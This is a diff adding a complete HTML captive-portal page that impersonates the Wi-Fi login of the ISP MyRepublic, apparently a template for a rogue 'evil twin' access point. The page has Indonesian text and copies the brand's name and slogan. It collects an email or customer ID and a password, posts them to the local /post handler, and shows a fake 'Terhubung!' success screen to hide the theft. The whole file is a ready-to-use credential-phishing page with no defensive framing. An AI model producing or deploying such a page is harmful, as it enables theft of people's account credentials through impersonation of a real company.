@@ -1,0 +1,74 @@
+<!-- AP="MyRepublic-WiFi" -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>MyRepublic - WiFi Zone</title>
+  <meta charset='UTF-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+  <style>
+    body{font-family: 'Segoe UI', Arial, sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);margin:0;padding:0;display:flex;align-items:center;justify-content:center;min-height:100vh;}
+    .card{background:#fff;border-radius:16px;overflow:hidden;max-width:380px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.2);}
+    .hero{background:linear-gradient(135deg,#6c3fc1 0%,#4a1d96 100%);padding:32px 24px;text-align:center;}
+    .hero h1{color:#fff;font-size:20px;margin:0;font-weight:700;}
+    .hero p{color:#d4bfff;font-size:13px;margin:6px 0 0 0;}
+    .hero .pulse{width:60px;height:60px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:28px;}
+    .content{padding:24px;}
+    .welcome{text-align:center;margin-bottom:20px;}
+    .welcome h2{font-size:18px;color:#333;margin:0;}
+    .welcome p{font-size:13px;color:#777;margin:6px 0 0 0;}
+    .input-group{margin-bottom:14px;}
+    .input-group input{width:100%;padding:12px 14px;border:2px solid #e8e8e8;border-radius:10px;font-size:15px;box-sizing:border-box;transition:border-color .2s;}
+    .input-group input:focus{border-color:#6c3fc1;outline:none;}
+    .btn{background:linear-gradient(135deg,#6c3fc1 0%,#4a1d96 100%);color:#fff;border:none;border-radius:10px;padding:14px;font-size:16px;font-weight:700;width:100%;cursor:pointer;}
+    .btn:hover{opacity:0.95;}
+    .terms{text-align:center;font-size:11px;color:#aaa;margin-top:16px;}
+    .terms a{color:#6c3fc1;text-decoration:none;}
+    #form-block{display:block;}
+    #success-block{display:none;text-align:center;padding:20px 0;}
+    .spinner{width:36px;height:36px;border:3px solid #e8e8e8;border-top:3px solid #6c3fc1;border-radius:50%;animation:spin .8s linear infinite;margin:16px auto;}
+    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="hero">
+      <div class="pulse">W</div>
+      <h1>MyRepublic</h1>
+      <p>Pure Speed. Pure Entertainment.</p>
+    </div>
+    <div class="content">
+      <div class="welcome">
+        <h2>Selamat datang!</h2>
+        <p>Masuk untuk menikmati internet cepat MyRepublic</p>
+      </div>
+      <div id="form-block">
+        <form action='/post' id='login-form'>
+          <div class="input-group">
+            <input name='email' type='text' placeholder='Email atau ID Pelanggan' required>
+          </div>
+          <div class="input-group">
+            <input name='password' type='password' placeholder='Password' required>
+          </div>
+          <button class="btn" type="submit">Masuk</button>
+        </form>
+        <div class="terms">
+          Dengan login, Anda menyetujui <a href="#">Syarat & Ketentuan</a> MyRepublic
+        </div>
+      </div>
+      <div id="success-block">
+        <p style="font-size:18px;font-weight:700;color:#6c3fc1;">✓ Terhubung!</p>
+        <p style="font-size:13px;color:#777;">Selamat menikmati internet cepat...</p>
+        <div class="spinner"></div>
+      </div>
+    </div>
+  </div>
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      document.getElementById('form-block').style.display = 'none';
+      document.getElementById('success-block').style.display = 'block';
+      setTimeout(function() { document.getElementById('login-form').submit(); }, 3000);
+    });
+  </script>
+</body>
+</html>
